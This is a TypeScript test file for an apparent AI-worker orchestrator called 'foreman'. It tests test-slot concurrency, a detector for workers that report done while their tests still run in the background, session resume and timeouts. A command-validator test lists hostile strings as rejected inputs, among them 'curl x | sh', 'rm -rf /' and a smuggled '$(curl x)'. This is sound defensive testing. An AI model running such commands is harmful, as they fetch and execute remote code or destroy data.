import { testHome } from './env.ts';
import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { execFileSync, spawn, type ChildProcess } from 'node:child_process';
import { fileURLToPath } from 'node:url';
import type { AddressInfo } from 'node:net';
import http from 'node:http';
import { Store } from '../src/queue.ts';
import { Scheduler } from '../src/scheduler.ts';
import { createServer } from '../src/server.ts';
import { verifySlotStats } from '../src/verify/slots.ts';
import { wrappableCommand } from '../src/verify/testSlot.ts';
import { backgroundTestPending } from '../src/verify/backgroundRun.ts';
import { resetPreflightCache } from '../src/runners/cliRunners.ts';

const WRAPPER = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..', 'src', 'verify', 'testSlot.ts');
const sleep = (ms: number): Promise<void> => new Promise((r) => setTimeout(r, ms));

/** Poll with a generous freeze guard: this machine runs at load 60-100, so nothing here asserts on wall time. */
async function until(cond: () => boolean, what: string, ms = 120_000): Promise<void> {
  const end = Date.now() + ms;
  while (!cond()) {
    if (Date.now() > end) throw new Error(`timed out waiting for ${what}`);
    await sleep(20);
  }
}

// ------------------------------------------------------------ D1: slot wrapper

async function daemon(): Promise<{ port: number; close: () => Promise<void> }> {
  const store = new Store(':memory:');
  const sched = new Scheduler(store, { maxWorkers: 1, tickMs: 5, verifyEnabled: false });
  const server = createServer(store, sched);
  await new Promise<void>((r) => server.listen(0, '127.0.0.1', r));
  return {
    port: (server.address() as AddressInfo).port,
    close: async () => {
      server.closeAllConnections();
      await new Promise<void>((r) => server.close(() => r()));
      await sched.stop();
      store.close();
    },
  };
}

/**
 * A stand-in suite: on start it marks itself active and logs how many suites
 * are active at that moment (itself included), sleeps, then unmarks itself.
 */
function stubSuite(): { dir: string; cmd: (sleepMs: number) => string; peak: () => number; started: () => number; activePids: () => number[] } {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'foreman-suite-'));
  const script = path.join(dir, 'suite.mjs');
  fs.writeFileSync(
    script,
    `import fs from 'node:fs';\nimport path from 'node:path';\n` +
      `const dir = process.argv[2];\nconst me = path.join(dir, 'active-' + process.pid);\n` +
      `fs.writeFileSync(me, '');\n` +
      `const n = fs.readdirSync(dir).filter((f) => f.startsWith('active-')).length;\n` +
      `fs.appendFileSync(path.join(dir, 'log'), n + '\\n');\n` +
      `await new Promise((r) => setTimeout(r, Number(process.argv[3])));\n` +
      `fs.rmSync(me, { force: true });\n`,
  );
  const lines = (): number[] =>
    (fs.existsSync(path.join(dir, 'log')) ? fs.readFileSync(path.join(dir, 'log'), 'utf8') : '').split('\n').filter(Boolean).map(Number);
  return {
    dir,
    cmd: (ms) => `node ${script} ${dir} ${ms}`,
    peak: () => Math.max(0, ...lines()),
    started: () => lines().length,
    activePids: () => fs.readdirSync(dir).filter((f) => f.startsWith('active-')).map((f) => Number(f.slice(7))),
  };
}

function wrapper(port: number, testCmd: string): { child: ChildProcess; exit: Promise<number | null> } {
  const child = spawn(process.execPath, [WRAPPER], {
    cwd: os.tmpdir(),
    env: {
      ...process.env,
      FOREMAN_HOME: testHome,
      FOREMAN_HOST: '127.0.0.1',
      FOREMAN_PORT: String(port),
      FOREMAN_WORKER_TEST_CMD: testCmd,
    },
    stdio: ['ignore', 'ignore', 'pipe'],
  });
  child.stderr!.resume();
  const exit = new Promise<number | null>((r) => child.on('exit', (code) => r(code)));
  return { child, exit };
}

function withCap<T>(cap: string, fn: () => Promise<T>): Promise<T> {
  const prev = process.env['FOREMAN_MAX_VERIFIES'];
  process.env['FOREMAN_MAX_VERIFIES'] = cap;
  return fn().finally(() => {
    if (prev === undefined) delete process.env['FOREMAN_MAX_VERIFIES'];
    else process.env['FOREMAN_MAX_VERIFIES'] = prev;
  });
}

test('two concurrent worker test-slot runs under FOREMAN_MAX_VERIFIES=1 never overlap', () =>
  withCap('1', async () => {
    const d = await daemon();
    const suite = stubSuite();
    try {
      const a = wrapper(d.port, suite.cmd(1500));
      const b = wrapper(d.port, suite.cmd(1500));
      assert.deepEqual(await Promise.all([a.exit, b.exit]), [0, 0], 'each wrapper exits with its suite\'s status');
      assert.equal(suite.started(), 2, 'both suites ran');
      assert.equal(suite.peak(), 1, 'peak concurrency is the cap, not the number of workers');
      assert.deepEqual(verifySlotStats(), { active: 0, waiting: 0 });
    } finally {
      await d.close();
      fs.rmSync(suite.dir, { recursive: true, force: true });
    }
  }));

test('a killed wrapper releases its slot, and the queued one then runs', () =>
  withCap('1', async () => {
    const d = await daemon();
    const suite = stubSuite();
    const wrappers: ChildProcess[] = [];
    try {
      const a = wrapper(d.port, suite.cmd(600_000));
      wrappers.push(a.child);
      await until(() => suite.started() === 1, 'the first suite to start');
      const b = wrapper(d.port, suite.cmd(10));
      wrappers.push(b.child);
      await until(() => verifySlotStats().waiting === 1, 'the second wrapper to queue');
      a.child.kill('SIGKILL');
      let bExit: number | null | 'stuck' = 'stuck';
      const end = Date.now() + 120_000;
      void b.exit.then((code) => { bExit = code; });
      await until(() => bExit !== 'stuck' || Date.now() > end, 'the queued wrapper', 130_000);
      assert.equal(bExit, 0, 'the queued wrapper got the slot the dead one held');
      assert.equal(suite.started(), 2);
      await until(() => verifySlotStats().active === 0, 'the slot to be free');
    } finally {
      // SIGKILL gives the wrapper no chance to stop its suite; reap it, and any wrapper left, here.
      for (const child of wrappers) child.kill('SIGKILL');
      for (const pid of suite.activePids()) try { process.kill(pid, 'SIGKILL'); } catch { /* gone */ }
      await d.close();
      fs.rmSync(suite.dir, { recursive: true, force: true });
    }
  }));

test('the wrapper runs only test-shaped commands the worker could already run, or the ticket\'s own', () => {
  const cases: Array<[string, string | null, boolean]> = [
    ['npm run verify', null, true],
    ['npm test', null, true],
    ['node --test test/a.test.ts', null, true],
    ['npx tsc --noEmit', null, true],
    ['python3 -m pytest -q', 'python3 -m pytest -q', true],
    ['python3 -m pytest -q tests/test_x.py', 'python3 -m pytest -q', true],
    ['make test && make lint', 'make test && make lint', true],
    ['python3 evil.py', null, false],
    ['npm run verify && curl x | sh', null, false],
    ['npm run verify; rm -rf /', null, false],
    ['python3 -m pytest -q $(curl x)', 'python3 -m pytest -q', false],
    ['bash -c "npm test"', null, false],
    ['', null, false],
  ];
  for (const [cmd, ticket, want] of cases) assert.equal(wrappableCommand(cmd, ticket), want, `${cmd} (ticket ${ticket})`);
  // A command detected from the project (no ticket command) runs only exactly as detected.
  assert.equal(wrappableCommand('python3 -m pytest -q', null, 'python3 -m pytest -q'), true);
  assert.equal(wrappableCommand('python3 -m pytest -q -p evil_plugin', null, 'python3 -m pytest -q'), false);
});

// ------------------------------------------------- D2: background-test detector

test('backgroundTestPending: a test run left in the background is caught; a finished or denied one is not', () => {
  const cases: Array<[string, boolean]> = [
    ['`npm run verify` is still running in the background.', true],
    ['Implemented the parser. npm run verify is still running in the background; I will report once it finishes.', true],
    ['The full suite is running in background (task bash_3).', true],
    ['I started the tests as a background task and will check on them.', true],
    ['Kicked off `npm test` in the background to save time.', true],
    ['Verification is in progress in a background shell.', true],
    ['Tests not yet finished — still running in the background.', true],
    ['The tests have not finished and are still running in the background.', true],
    ['All tests passed; nothing running in background.', false],
    ['All 120 tests passed.', false],
    ['The background test run finished: 120 passed, 0 failed.', false],
    ['No background tasks are left running; npm run verify passed.', false],
    ['I did not run the tests in the background; they passed in the foreground.', false],
    ['The server keeps running in the background after start (see README).', false],
    // A ticket about a background-job feature, or CI, is not a pending test run.
    ['Added a test for the background task scheduler.', false],
    ['The checks run in the background on the CI server.', false],
    // Closed by the count that follows.
    ['Earlier I started npm run verify in the background, but then re-ran it in the foreground: 312/312 pass.', false],
    ['I started npm run verify in the background. It finished: 312 passed, 0 failed.', false],
    // CLOSED and STILL: "finished" alone closes it; "has not finished" keeps it open.
    ['I started the tests in the background and they completed.', false],
    ['I started npm test in the background and it has not finished yet.', true],
    ['The verify run is going in shell bash_7.', true],
    // Still going, whatever else the report counts: a targeted file's result does not close the suite's run.
    ['I ran the full test suite in the background; it has not finished yet.', true],
    ['The verify run is still in the background.', true],
    ['npm run verify is in the background and will report when done.', true],
    ['Started npm run verify in the background. Targeted run: 12 passed.', true],
    ['I kicked off npm run verify in the background; node --test test/foo.test.ts: 5 passed.', true],
    ['Full verify running in the background (still in progress). The new test file passes: 8 tests 8 pass.', true],
    // The feature under test runs in the background; no test run is pending.
    ['Added a test: the job is put in the background queue and the test passes.', false],
    ['Tests: the scheduler is in the background task runner module.', false],
    ['Test coverage: the sync is in the background thread, verified by a new test that passes.', false],
    ['The new test checks that the export is still in the background queue while pending.', false],
    ['The test asserts the upload is still running in the background after the page unloads. node --test test/upload.test.ts: 5 pass.', false],
    // "ran" is past unless something says it is still going.
    ['I ran the test suite in the background earlier; it passed.', false],
    // The adjective form.
    ['Waiting for the background verify run to finish.', true],
    ['The background npm run verify job has not finished.', true],
    ['npm run verify (background) is still going.', true],
    // A still-going word in the next sentence has to be about the run.
    ['I ran the test suite in the background. Still to do: update the README.', false],
    ['Added tests: the worker keeps running in the background and the test passes.', false],
    ['New test: checks remain pending while the job is in the background queue.', false],
    ['', false],
  ];
  for (const [text, want] of cases) assert.equal(backgroundTestPending(text), want, text);
  assert.equal(backgroundTestPending(null), false);
});

// --------------------------------------- D2: background run is resumed, not reviewed

function fixtureRepo(): string {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'foreman-bg-repo-'));
  const git = (...args: string[]): void => void execFileSync('git', args, { cwd: dir, stdio: 'ignore' });
  git('init', '-q');
  git('config', 'user.email', 'test@example.com');
  git('config', 'user.name', 'Test');
  fs.writeFileSync(path.join(dir, 'README.md'), 'base\n');
  git('add', '-A');
  git('commit', '-qm', 'base');
  return dir;
}

/**
 * A `claude` stand-in. Every run announces session sess-1 and edits README.md;
 * a cold run ends with `firstMsg`, a --resume run with `resumedMsg`.
 */
function stubClaude(firstMsg: string, resumedMsg: string, resumeFails = false): { dir: string; runs: () => string[][] } {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'foreman-bg-cli-'));
  const log = path.join(dir, 'argv.log');
  fs.writeFileSync(path.join(dir, 'first'), JSON.stringify(firstMsg));
  fs.writeFileSync(path.join(dir, 'resumed'), JSON.stringify(resumedMsg));
  const bin = path.join(dir, 'claude');
  fs.writeFileSync(
    bin,
    `#!/bin/sh\n` +
      `for a in "$@"; do printf '%s\\n' "$a" >> "${log}"; done\n` +
      `printf '<<<END>>>\\n' >> "${log}"\n` +
      `[ "$1" = "--version" ] && { printf '1.2.3\\n'; exit 0; }\n` +
      `msg=$(cat "${dir}/first")\n[ "$1" = "--resume" ] && msg=$(cat "${dir}/resumed")\n` +
      (resumeFails ? `[ "$1" = "--resume" ] && { printf 'session crashed\\n' >&2; exit 3; }\n` : '') +
      `env | grep -E '^(BASH_|FOREMAN_WORKER_TEST_CMD)' >> "${dir}/env.log"\n` +
      // Only in a jail: a crew reviewer call runs this stub from the test's own cwd (this checkout).
      `[ "$(pwd -P)" = "${fs.realpathSync(process.cwd())}" ] || printf 'edit\\n' >> README.md\n` +
      `printf '{"type":"system","subtype":"init","session_id":"sess-1"}\\n'\n` +
      `printf '{"type":"result","subtype":"success","is_error":false,"session_id":"sess-1","result":%s}\\n' "$msg"\n`,
  );
  fs.chmodSync(bin, 0o755);
  process.env['FOREMAN_CLAUDE_BIN'] = bin;
  resetPreflightCache();
  const runs = (): string[][] =>
    (fs.existsSync(log) ? fs.readFileSync(log, 'utf8') : '')
      .split('<<<END>>>\n')
      .filter((c) => c.trim())
      .map((c) => c.split('\n').filter(Boolean))
      .filter((argv) => argv[0] !== '--version');
  return { dir, runs };
}

async function settle(sched: Scheduler, cond: () => boolean, what: string): Promise<void> {
  const end = Date.now() + 120_000;
  while (!cond()) {
    await sched.tick();
    if (Date.now() > end) throw new Error(`settle timed out: ${what}`);
    await sleep(10);
  }
}

async function bgRig(firstMsg: string, resumedMsg: string, body: (r: {
  store: Store; sched: Scheduler; reviews: () => number; runs: () => string[][]; taskId: string; stubDir: string;
}) => Promise<void>, over: Record<string, unknown> = {}, resumeFails = false): Promise<void> {
  const stub = stubClaude(firstMsg, resumedMsg, resumeFails);
  const repo = fixtureRepo();
  const store = new Store(':memory:');
  let reviews = 0;
  const sched = new Scheduler(store, {
    tickMs: 5,
    maxWorkers: 1,
    verify: async ({ task, runId }) => {
      reviews++;
      return store.addVerdict({ runId, taskId: task.id, verdict: 'pass', disagreement: false, council: [] });
    },
  });
  try {
    const t = store.addTask({ title: 'Add a parser', prompt: 'Add a parser.', kind: 'code', runner: 'claude-code', repo, role: 'dev', ...over } as never);
    await body({ store, sched, reviews: () => reviews, runs: stub.runs, taskId: t.id, stubDir: stub.dir });
  } finally {
    await sched.stop();
    store.close();
    delete process.env['FOREMAN_CLAUDE_BIN'];
    resetPreflightCache();
    fs.rmSync(stub.dir, { recursive: true, force: true });
    fs.rmSync(repo, { recursive: true, force: true });
  }
}

test('a worker that ends with its verify still in the background is resumed once, then reviewed on the result', () =>
  bgRig('Done. `npm run verify` is still running in the background.', 'npm run verify finished: 42 passed, 0 failed.', async (r) => {
    await settle(r.sched, () => r.reviews() > 0 || r.store.getTask(r.taskId)!.status === 'failed', 'a review');
    const runs = r.runs();
    assert.equal(runs.length, 2, 'one cold run, one resume');
    assert.equal(runs[1]![0], '--resume');
    assert.equal(runs[1]![1], 'sess-1', 'the same session, so the worker still has its context');
    assert.match(runs[1]!.join('\n'), /Wait for the background test run to finish/);
    assert.equal(r.reviews(), 1, 'the review saw the resumed result, and only that');
    const summary = r.store.getRun(r.store.latestRun(r.taskId)!.id)!.summary ?? '';
    assert.match(summary, /^Done\./, 'the account of the work is kept');
    assert.match(summary, /--- after resume ---\nnpm run verify finished: 42 passed, 0 failed\.$/, 'followed by the resumed result');
    assert.ok(r.store.eventsForTask(r.taskId).some((e) => /resuming session sess-1 once/.test(e.message)), 'recorded in the timeline');
  }));

test('a worker that ends normally goes straight to review, unresumed', () =>
  bgRig('Done. All tests passed; nothing running in background.', 'unused', async (r) => {
    await settle(r.sched, () => r.reviews() > 0, 'a review');
    assert.equal(r.runs().length, 1);
    assert.equal(r.runs()[0]!.includes('--resume'), false);
  }));

test('with no session to resume, a background test run is requeued as a repair round without a review', async () => {
  process.env['FOREMAN_CLAUDE_RESUME'] = 'off';
  try {
    await bgRig('Done. npm run verify is still running in the background.', 'unused', async (r) => {
      await settle(r.sched, () => (r.store.getTask(r.taskId)!.preReviewRepairs ?? 0) > 0, 'a requeue');
      const t = r.store.getTask(r.taskId)!;
      assert.match(t.repairNotes ?? '', /Wait for the background test run to finish/);
      assert.equal(r.reviews(), 0, 'no reviewer was spent on unconfirmed work');
      assert.equal(r.runs()[0]!.includes('--resume'), false);
    });
  } finally {
    delete process.env['FOREMAN_CLAUDE_RESUME'];
  }
});

/** A one-reviewer crew playbook 'solo' in FOREMAN_PLAYBOOKS_DIR; returns its dir. */
function soloPlaybook(): string {
  const pbDir = fs.mkdtempSync(path.join(os.tmpdir(), 'foreman-bg-pb-'));
  fs.writeFileSync(path.join(pbDir, 'solo.md'), `---
${JSON.stringify({
    id: 'solo', description: 'One reviewer.', triggers: ['solo'],
    roles: { planner: { tier: 'owner' }, senior: { tier: 'senior' }, dev: { tier: 'worker' } },
    reviewers: [{ role: 'senior', style: 'code-review' }],
    escalation: { chair: 'planner', afterFailures: 2 }, checks: [], gate: { default: 'human', hardHuman: [] }, constraints: [],
  })}
---

## role: planner

Chair.

## role: senior

Review.

## role: dev

Implement.
`);
  process.env['FOREMAN_PLAYBOOKS_DIR'] = pbDir;
  return pbDir;
}

test('a background test run does not hide a scope violation: both go into the repair notes', async () => {
  // A crew playbook, so the scope guard applies; README.md is the file the stub CLI always edits.
  const pbDir = soloPlaybook();
  process.env['FOREMAN_CLAUDE_RESUME'] = 'off';
  try {
    await bgRig('Done. npm run verify is still running in the background.', 'unused', async (r) => {
      await settle(r.sched, () => (r.store.getTask(r.taskId)!.preReviewRepairs ?? 0) > 0, 'a requeue');
      const notes = r.store.getTask(r.taskId)!.repairNotes ?? '';
      assert.match(notes, /Wait for the background test run to finish/);
      assert.match(notes, /README\.md \(Do NOT touch README\.md\)/, 'the scope violation is named too');
      assert.equal(r.reviews(), 0);
    }, { playbook: 'solo', forbiddenPaths: ['README.md'] });
  } finally {
    delete process.env['FOREMAN_CLAUDE_RESUME'];
    delete process.env['FOREMAN_PLAYBOOKS_DIR'];
    fs.rmSync(pbDir, { recursive: true, force: true });
  }
});

test('a resume that fails keeps the finished work: requeued as a pre-review repair, not failed', () =>
  bgRig('Done. npm run verify is still running in the background.', 'unused', async (r) => {
    await settle(r.sched, () => (r.store.getTask(r.taskId)!.preReviewRepairs ?? 0) > 0 || r.store.getTask(r.taskId)!.status === 'failed', 'a settle');
    const t = r.store.getTask(r.taskId)!;
    assert.equal(t.preReviewRepairs, 1, `ended ${t.status}: ${t.error ?? ''}`);
    assert.equal(t.status, 'queued');
    assert.equal(t.repairs, 0, 'not a worker failure');
    assert.equal(r.reviews(), 0);
  }, {}, true));

test('the ACCEPTANCE MAP from the first turn still counts after a resume', async () => {
  const pbDir = soloPlaybook();
  try {
    await bgRig(
      'Done.\nACCEPTANCE MAP\n1. (diff) README.md\n\n`npm run verify` is still running in the background.',
      'npm run verify finished: 42 passed, 0 failed.',
      async (r) => {
        await settle(r.sched, () => r.reviews() > 0 || (r.store.getTask(r.taskId)!.preReviewRepairs ?? 0) > 0, 'a review or a repair');
        const t = r.store.getTask(r.taskId)!;
        assert.equal(t.preReviewRepairs, 0, `the map was read: ${t.repairNotes ?? ''}`);
        assert.equal(r.reviews(), 1);
      },
      { playbook: 'solo', acceptance: '1. README.md gains an edit line' },
    );
  } finally {
    delete process.env['FOREMAN_PLAYBOOKS_DIR'];
    fs.rmSync(pbDir, { recursive: true, force: true });
  }
});

test('the worker session gets the ticket test command and only a Bash ceiling, capped at the task timeout', async () => {
  const saved = { d: process.env['BASH_DEFAULT_TIMEOUT_MS'], m: process.env['BASH_MAX_TIMEOUT_MS'], t: process.env['FOREMAN_TASK_TIMEOUT_MS'], o: process.env['npm_config_offline'] };
  delete process.env['BASH_DEFAULT_TIMEOUT_MS'];
  delete process.env['BASH_MAX_TIMEOUT_MS'];
  process.env['FOREMAN_TASK_TIMEOUT_MS'] = '600000';
  // The fixture repo has no typescript, so the gate's `npx tsc` asks the registry for one. Offline it fails at once,
  // everywhere; left to the network it took two minutes of retries where there is none (a sandboxed gate).
  process.env['npm_config_offline'] = 'true';
  try {
    await bgRig('Done. All tests passed; nothing running in background.', 'unused', async (r) => {
      await settle(r.sched, () => r.reviews() > 0 || r.store.getTask(r.taskId)!.status === 'failed', 'a review');
      const env = fs.readFileSync(path.join(r.stubDir, 'env.log'), 'utf8');
      assert.match(env, /^FOREMAN_WORKER_TEST_CMD=npx tsc --noEmit$/m, 'the wrapper learns the ticket command');
      assert.match(env, /^BASH_MAX_TIMEOUT_MS=600000$/m, 'the ceiling never exceeds the task timeout');
      assert.doesNotMatch(env, /^BASH_DEFAULT_TIMEOUT_MS=/m, 'no long default: a serve or watch script is still cut at 2 minutes');
    }, { testCmd: 'npx tsc --noEmit' });
  } finally {
    for (const [k, v] of [['BASH_DEFAULT_TIMEOUT_MS', saved.d], ['BASH_MAX_TIMEOUT_MS', saved.m], ['FOREMAN_TASK_TIMEOUT_MS', saved.t], ['npm_config_offline', saved.o]] as const) {
      if (v === undefined) delete process.env[k];
      else process.env[k] = v;
    }
  }
});

test('the wrapper gives up past FOREMAN_SLOT_WAIT_MS without running the command', async () => {
  // A daemon that queues the wrapper and never grants.
  const server = http.createServer((req, res) => {
    res.writeHead(200, { 'content-type': 'text/plain' });
    res.write('queued\n');
    req.on('close', () => res.destroy());
  });
  await new Promise<void>((r) => server.listen(0, '127.0.0.1', r));
  const port = (server.address() as AddressInfo).port;
  const work = fs.mkdtempSync(path.join(os.tmpdir(), 'foreman-slotwait-'));
  const marker = path.join(work, 'ran');
  try {
    let stderr = '';
    const child = spawn(process.execPath, [WRAPPER], {
      cwd: work,
      env: { ...process.env, FOREMAN_HOME: testHome, FOREMAN_HOST: '127.0.0.1', FOREMAN_PORT: String(port), FOREMAN_SLOT_WAIT_MS: '500', FOREMAN_WORKER_TEST_CMD: `touch ${marker}` },
      stdio: ['ignore', 'ignore', 'pipe'],
    });
    child.stderr!.setEncoding('utf8').on('data', (c: string) => { stderr += c; });
    const code = await new Promise<number | null>((r) => child.on('exit', (c) => r(c)));
    assert.equal(code, 3, stderr);
    assert.match(stderr, /slot wait exceeded/);
    assert.equal(fs.existsSync(marker), false, 'never run unslotted');
  } finally {
    server.closeAllConnections();
    await new Promise<void>((r) => server.close(() => r()));
    fs.rmSync(work, { recursive: true, force: true });
  }
});
